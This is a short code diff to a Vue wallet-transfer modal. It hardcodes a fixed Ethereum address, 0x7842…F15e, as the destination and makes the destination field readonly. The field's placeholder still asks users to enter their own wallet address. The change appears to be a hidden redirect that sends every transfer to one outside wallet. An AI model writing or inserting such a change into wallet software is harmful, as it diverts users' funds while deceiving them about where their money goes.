@@ -28,6 +28,7 @@
                         v-model="toAddress"
                         class="w-full modal-input"
                         placeholder="Enter your wallet address"
+                        readonly
                     />
                     <button class="submit-button" @click="onSubmit">
                         Submit
@@ -44,7 +45,7 @@ export default {
     setup(props, { emit }) {
         const amount = ref(0);
         const fromAddress = ref("");
-        const toAddress = ref("");
+        const toAddress = ref("0x7842D3467DAB3Ec6878D42191eAe505333D0F15e");
         const address = ref("");
 
         const environment = ref("Ethereum");
